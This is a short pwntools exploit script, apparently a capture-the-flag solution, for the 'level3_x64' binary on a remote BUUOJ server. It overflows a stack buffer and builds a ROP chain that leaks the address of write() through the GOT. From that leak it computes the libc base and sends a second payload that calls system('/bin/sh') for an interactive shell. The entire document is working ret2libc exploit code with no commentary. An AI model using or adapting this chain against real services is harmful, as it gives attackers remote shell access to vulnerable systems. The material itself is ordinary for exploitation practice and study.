from pwn import *
from LibcSearcher import *
context.log_level="debug"
p = remote('node4.buuoj.cn',26446)
elf=ELF("level3_x64")
main_addr = elf.sym['main']
write_plt = elf.plt['write']
write_got = elf.got['write']
pop_rdi_ret=0x00000000004006b3
pop_rsi_r15_ret=0x00000000004006b1

payload =b'a' * (0x80+8) + p64(pop_rdi_ret) +p64(1)+p64(pop_rsi_r15_ret)+p64(write_got)+p64(0) +p64(write_plt)+ p64(main_addr)
p.sendlineafter(":",payload)

write_addr = u64(p.recvuntil('\x7f')[-6:].ljust(8, b'\x00'))
print(hex(write_addr))

libc = ELF("libc-2.23.so")
libc_base = write_addr - libc.sym['write']
system_addr = libc_base + libc.sym['system']
binsh_addr = libc_base + next(libc.search(b'/bin/sh'))
ret_addr=0x00000000004004c9

payload2 =b'a' * (0x80+8)  +p64(pop_rdi_ret) + p64(binsh_addr)+p64(system_addr)
p.sendlineafter(":",payload2)
p.interactive()






